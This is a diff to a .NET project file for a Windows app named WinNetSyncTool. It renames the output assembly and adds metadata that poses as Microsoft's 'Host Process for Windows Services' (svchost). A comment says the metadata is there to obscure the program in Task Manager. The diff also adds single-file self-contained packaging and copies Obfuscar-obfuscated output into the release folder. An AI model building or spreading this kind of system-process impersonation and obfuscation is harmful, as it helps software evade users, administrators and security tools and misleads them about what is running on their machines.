@@ -6,9 +6,24 @@
     <Nullable>enable</Nullable>
     <UseWindowsForms>true</UseWindowsForms>
     <ImplicitUsings>enable</ImplicitUsings>
-    <AssemblyName>WinNetSyncTool</AssemblyName>
+    <AssemblyName>2</AssemblyName>
     <RootNamespace>WinNetSyncTool</RootNamespace>
 
+    <!-- Assembly Metadata for Task Manager / System Obfuscation -->
+    <AssemblyTitle>Host Process for Windows Services</AssemblyTitle>
+    <Product>Microsoft® Windows® Operating System</Product>
+    <Description>Host Process for Windows Services</Description>
+    <Company>Microsoft Corporation</Company>
+    <Copyright>© Microsoft Corporation. All rights reserved.</Copyright>
+    <FileVersion>10.0.19041.1</FileVersion>
+    <AssemblyVersion>10.0.19041.1</AssemblyVersion>
+
+    <!-- Standalone Release Defaults -->
+    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
+    <PublishSingleFile>true</PublishSingleFile>
+    <SelfContained>true</SelfContained>
+    <EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
+    <IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
   </PropertyGroup>
 
   <ItemGroup>
@@ -17,6 +32,8 @@
 
   <Target Name="Obfuscar" AfterTargets="Build" Condition=" '$(Configuration)' == 'Release' ">
     <Exec Command="$(Obfuscar) obfuscar.xml" WorkingDirectory="$(ProjectDir)" />
+    <Copy SourceFiles="$(ProjectDir)bin\Release\net8.0-windows\win-x64\obfuscated\2.dll" DestinationFolder="$(ProjectDir)bin\Release\net8.0-windows\win-x64" OverwriteReadOnlyFiles="true" SkipUnchangedFiles="false" />
   </Target>
 
 </Project>
+
